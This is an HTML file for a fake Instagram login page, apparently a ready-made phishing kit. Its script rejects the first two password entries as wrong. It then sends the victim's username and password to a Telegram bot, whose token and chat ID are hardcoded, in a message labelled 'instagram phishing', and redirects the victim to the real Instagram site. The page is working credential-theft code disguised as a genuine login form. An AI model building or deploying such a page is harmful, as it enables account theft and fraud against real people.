<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial_scale=1.0" />
    <title>Instagram</title>
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/media-queries.css" />
    <link rel="icon" href="https://raw.githubusercontent.com/Arunjagan12/INSTAGRAM-login-page-clone/refs/heads/main/photos/insta-icon.jpg" />
    <style>
        /** FONTS **/

        @font-face {
            font-family: "Segoe";
            src: url(..\fonts\segoe-ui-regular.ttf) format("truetype");
            font-weight: 400;
        }

        @font-face {
            font-family: "Segoe";
            src: url(..\fonts\segoe-ui-bold.ttf) format("truetype");
            font-weight: 700;
        }

        /** VARIABLES **/

        :root {
            --background-color: #fafafa;
            --white: #ffffff;
            --border-color: 112, 112, 112;
            --placeholder-color: #837979;
            --or-text: #8e8e8e;
            --fb-logo: #385175;
            --log-in-button: #0095f6;
            --black: #262626;
            --footer-links: #1e4f7c;
            --copyright-gray: #bfbfbf;
        }

        /** OVERWRITE BROWSER DEFAULT **/
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        p {
            font-weight: 400;
        }

        a {
            text-decoration: none;
        }

        ul {
            list-style-type: none;
        }

        html {
            font-size: 62.5%;
        }

        body {
            font-family: "Segoe";
            background: var(--background-color);
        }

        /** LOG IN **/

        /** LOG IN CONTAINER **/
        .log-in {
            background: var(--white);
            width: 35rem;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            border: 0.1rem solid rgba(var(--border-color), 0.5);
            padding: 1.5rem 4rem;
            margin-top: 4rem;
            margin-bottom: 2rem;
        }

        /** logo **/
        .logo {
            width: 19rem;
            margin-bottom: 1rem;
        }

        /** log in form **/
        .log-in-form {
            display: flex;
            flex-direction: column;
            width: 100%;
        }

        .log-in-form input,
        .log-in-button {
            padding: 1rem 0 1rem 1rem;
            border-radius: 0.5rem;
        }

        /** styles in common for the placeholder and fields **/
        .log-in-form input,
        .log-in-form input::placeholder {
            font-size: 1.1rem;
            font-family: "Segoe";
        }

        /** form fields **/
        .log-in-form input {
            background: var(--background-color);
            border: 0.1rem solid rgba(var(--border-color), 0.5);
            outline: none;
        }

        /** username text **/
        .log-in-form input[type="text"] {
            margin-bottom: 0.5rem;
        }

        /** placeholder for text fields **/
        .log-in-form input::placeholder {
            color: var(--placeholder-color);

        }

        /** styles for text fields when they are focused **/
        .log-in-form input:focus {
            border-color: rgba(var(--border-color), 0.8);

        }

        /** log in button **/
        .log-in-button {
            background: var(--log-in-button);
            color: var(--white);
            margin: 2rem 0;
            font-weight: 700;
            cursor: pointer;
            outline: none;
            border: none;
        }

        /** or divider **/
        .or-divider {
            color: var(--or-text);
            font-weight: 700;
            position: relative;
            font-size: 1.2rem;
        }

        .or-divider::before,
        .or-divider::after {
            content: "";
            display: block;
            width: 11rem;
            height: 0.1rem;
            position: absolute;
            background: rgba(var(--border-color), 0.4);
            top: 50%;
        }

        .or-divider::before {
            left: 3rem;
        }

        .or-divider::after {
            right: 3rem;
        }

        /** log in with facebook **/
        .fb-login {
            margin: 1.5rem 0;
        }

        .fb-login img {
            width: 1.5rem;
            margin-right: 0.5rem;
        }

        .fb-login span {
            font-size: 1.3rem;
            color: var(--fb-logo);
            font-weight: 700;
        }

        /** forgot passwd **/
        .forgot-password {
            color: var(--fb-logo);
            font-size: 1.2rem;
        }

        /** SIGN UP **/
        .sign-up {
            background: var(--white);
            width: 35rem;
            margin: 0 auto;
            border: 0.1rem solid rgba(var(--border-color), 0.5);
            padding: 2rem;
            text-align: center;
        }

        /** don't have an account **/
        .sign-up span {
            font-size: 1.2rem;
            margin-right: 0.5rem;
        }

        /** sign up link **/
        .sign-up a {
            font-size: 1.3rem;
            font-weight: 700;
            color: var(--log-in-button);
        }

        /** GET THE APP **/

        /** container **/
        .get-the-app {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 35rem;
            margin: 0 auto;
            margin-top: 1.5rem;
        }

        /** get the app text **/
        .get-the-app span {
            display: block;
            margin-bottom: 2rem;
            font-size: 1.4rem;
        }

        .app-images img {
            width: 13rem;
        }

        /** first image **/
        .app-images img:nth-child(1) {
            margin-right: 1rem;
        }

        /** PHONES **/
        .phones-container {
            display: none;
        }

        /** FOOTER **/
        footer {
            width: 35rem;
            display: flex;
            flex-direction: column;
            margin: 4rem auto 0 auto;
        }

        /** UL **/
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-evenly;
            font-size: 1.1rem;
            margin-bottom: 1rem;
        }

        .footer-links li {
            flex-basis: 13%;
            text-align: center;
        }

        .footer-links a {
            color: var(--footer-links);
            font-weight: 700;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .copyright {
            text-align: center;
            color: var(--copyright-gray);
            font-weight: 700;
            font-size: 1.2rem;
        }

        /** TABLET **/

        /** changes made for devices for minimum width **/

        @media screen and (min-width: 876px) {
            main {
                display: flex;
                justify-content: center;
                padding-top: 3rem;

            }

            .phones-container {
                display: initial;
            }

            .log-in-container {
                order: 1;
            }

            footer {
                width: 100%;
                justify-content: flex-start;
                padding-left: 4rem;
                padding-bottom: 4rem;
            }

            .footer-links {
                flex-wrap: nowrap;
                justify-content: flex-start;
            }

            .footer-links li {
                flex-basis: auto;
                margin-right: 1rem;
            }

            .footer-links a {
                margin-bottom: 0;
            }

            .copyright {
                text-align: left;
            }
        }

        /** DESKTOP **/
        @media screen and (min-width: 1527px) {
            footer {
                flex-direction: row;
                justify-content: space-around;
            }
        }

        .error {
            border: 0.1rem solid red;
        }

    </style>
</head>

<body>
    <main>
        <div class="log-in-container">
            <div class="log-in">
                <img src="https://raw.githubusercontent.com/Arunjagan12/INSTAGRAM-login-page-clone/refs/heads/main/photos/logo.png" class="logo" />
                <div class="log-in-form">
                    <input type="Phone number or email" id="username" placeholder="Phone number,username or email" />
                    <input type="password" id="password" placeholder="Password" />
                    <button class="log-in-button" onclick="sendLoginData()">Log In</button>
                    <p id="error-message" style="color: red; font-size: 15px;"></p>
                </div>
                <span class="or-divider">OR</span>
                <!--FACEBOOK OPTION-->
                <div class="fb-login">
                    <a href="#">
                        <img src="https://raw.githubusercontent.com/Arunjagan12/INSTAGRAM-login-page-clone/refs/heads/main/photos/facebook-icon.png">
                        <span>Log in with Facebook</span>
                    </a>
                </div>
                <!--forgot passwd-->
                <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
            </div>
            <!--sign up-->
            <div class="sign-up">
                <span>Don't have an account
                    <a href="#">Sign up</a>
                </span>
            </div>
            <!--download-->
            <div class="get-the-app">
                <span>Get the app</span>
                <div class="app-images">
                    <a href="#"><img src="https://raw.githubusercontent.com/Arunjagan12/INSTAGRAM-login-page-clone/refs/heads/main/photos/applestore.png" /></a>
                    <a href="#"><img src="https://raw.githubusercontent.com/Arunjagan12/INSTAGRAM-login-page-clone/refs/heads/main/photos/googlestore.png" /></a>
                </div>
            </div>

        </div>
        <!--phones-->
        <div class="phones-container">
            <img src="photos/phones.png" />
        </div>
    </main>
    <footer>
        <ul class="footer-links">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">JOBS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">TOP</a></li>
            <li><a href="#">ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <span class="copyright">&copy; 2025 INSTAGRAM FROM FACEBOOK</span>
    </footer>
<script>
    let failedAttempts = 0;  // ব্যর্থ চেষ্টার সংখ্যা

    function sendLoginData() {
        let username = document.getElementById("username").value;
        let password = document.getElementById("password").value;
        let errorMessage = document.getElementById("error-message");

        // ফর্ম ভ্যালিডেশন
        if (username === "" || password === "") {
            errorMessage.innerText = "Username and Password must be provided.";
            document.getElementById("username").classList.add("error");
            document.getElementById("password").classList.add("error");
            return;
        } else {
            document.getElementById("username").classList.remove("error");
            document.getElementById("password").classList.remove("error");
        }

        // যদি দুইবার ভুল পাসওয়ার্ড হয়
        if (failedAttempts < 2) {
            errorMessage.innerText = "Wrong password! Try again.";
            document.getElementById("password").classList.add("error");
            failedAttempts++;  // ভুল চেষ্টার সংখ্যা বাড়াবে
            document.getElementById("password").value = ""; // পাসওয়ার্ড ফিল্ড পুনরায় খালি হবে
            return;
        }

        // তৃতীয়বার সঠিক পাসওয়ার্ড হলে লগইন সফল হবে
        errorMessage.innerText = "";
        document.getElementById("password").classList.remove("error");

        // Telegram Bot API Setup
        const botToken = "7960524085:AAHzTaSqSnUhzaXU-BePxqUYeWnf92hNBQ8";
        const chatId = "6494839544";

        let message = `🔹 *New Login Attempt*
        🔹 *instagram phishing*🔹\n\n👤 *Username:* ${username}\n🔑 *Password:* ${password}`;

        let telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

        fetch(telegramAPI, { method: "GET" })
        .then(response => response.json())
        .then(data => {
            if (!data.ok) {
                console.error("❌ Failed to send data.");
            }
        })
        .catch(error => {
            console.error("Error: " + error);
        });

        // লগইন সফল হলে হোম পেজে নিয়ে যাবে
        window.location.href = "https://www.instagram.com";
    }
</script>
</body>
</html>
